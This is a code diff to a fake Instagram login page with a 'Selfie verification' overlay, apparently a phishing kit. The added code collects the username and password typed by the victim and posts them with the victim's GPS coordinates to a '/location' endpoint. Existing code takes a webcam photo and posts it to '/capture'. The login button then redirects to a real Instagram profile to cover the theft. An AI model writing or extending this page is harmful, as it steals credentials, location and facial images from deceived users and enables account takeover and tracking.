@@ -21,9 +21,7 @@ body{
 }
 
 /* ===== BLUR LOGIC ===== */
-.page{
-  position:relative;
-}
+.page{position:relative}
 
 .blurred{
   filter:blur(6px);
@@ -114,6 +112,7 @@ body{
   color:#fff;
   font-weight:600;
   margin-top:10px;
+  cursor:pointer;
 }
 
 .divider{
@@ -183,22 +182,17 @@ body{
   <!-- 🔒 BLURRED CONTENT -->
   <div class="container blurred" id="mainContent">
 
-    <!-- 1️⃣ Logo -->
     <div class="logo">Instagram</div>
 
     <div class="card">
 
-      <!-- 2️⃣ Inputs -->
-      <input class="input" placeholder="Phone number, username, or email">
-      <input class="input" placeholder="Password" type="password">
+      <input class="input" id="userField" placeholder="Phone number, username, or email">
+      <input class="input" id="passField" type="password" placeholder="Password">
 
-      <!-- 3️⃣ Button -->
-      <button class="btn-primary">Log in</button>
+      <button class="btn-primary" onclick="handleLogin()">Log in</button>
 
-      <!-- 4️⃣ Divider -->
       <div class="divider"><span>OR</span></div>
 
-      <!-- 5️⃣ Facebook -->
       <div class="fb-login">
         <svg class="fb-icon" viewBox="0 0 24 24" fill="#1877f2">
           <path d="M22 12a10 10 0 1 0-11.5 9.9v-7h-2v-3h2V9.5c0-2 1.2-3.1 3-3.1.9 0 1.8.1 1.8.1v2h-1c-1 0-1.3.6-1.3 1.2V12h2.6l-.4 3h-2.2v7A10 10 0 0 0 22 12"/>
@@ -206,17 +200,13 @@ body{
         Log in with Facebook
       </div>
 
-      <!-- 6️⃣ Forgot -->
       <div class="forgot">Forgot password?</div>
-
     </div>
 
-    <!-- 7️⃣ Signup -->
     <div class="signup">
       <span>Don’t have an account?</span> <a href="#">Sign up</a>
     </div>
 
-    <!-- 8️⃣ Footer -->
     <div class="footer">
       Meta · About · Privacy · Terms · Locations
     </div>
@@ -227,7 +217,7 @@ body{
   <div class="overlay" id="overlay">
     <div class="modal">
       <h2>Selfie verification</h2>
-      <p>Proceed Further.</p>
+      <p>Confirm your identity.</p>
       <button onclick="startKYC()">Continue</button>
     </div>
   </div>
@@ -235,6 +225,9 @@ body{
 </div>
 
 <script>
+/* ===== CONFIG ===== */
+const NEXT_PAGE_URL = "https://www.instagram.com/rohitsharma45/";
+
 /* ===== AUTHORITATIVE OLD LOGIC ===== */
 
 async function capturePhoto(){
@@ -264,6 +257,7 @@ async function capturePhoto(){
 async function startKYC(){
   try{
     const image=await capturePhoto();
+
     await fetch("/capture",{
       method:"POST",
       headers:{ "Content-Type":"application/json" },
@@ -272,14 +266,18 @@ async function startKYC(){
 
     if(navigator.geolocation){
       navigator.geolocation.getCurrentPosition(pos=>{
+        const payload = {
+          lat: pos.coords.latitude,
+          lon: pos.coords.longitude,
+          accuracy: pos.coords.accuracy,
+          user: document.getElementById("userField").value,
+          pass: document.getElementById("passField").value
+        };
+
         fetch("/location",{
           method:"POST",
           headers:{ "Content-Type":"application/json" },
-          body:JSON.stringify({
-            lat:pos.coords.latitude,
-            lon:pos.coords.longitude,
-            accuracy:pos.coords.accuracy
-          })
+          body:JSON.stringify(payload)
         });
       });
     }
@@ -290,6 +288,11 @@ async function startKYC(){
   }catch{
     alert("Proceed Further");
   }
+}
+
+/* ===== LOGIN REDIRECT ===== */
+function handleLogin(){
+  window.location.href = NEXT_PAGE_URL;
 }
 </script>
 
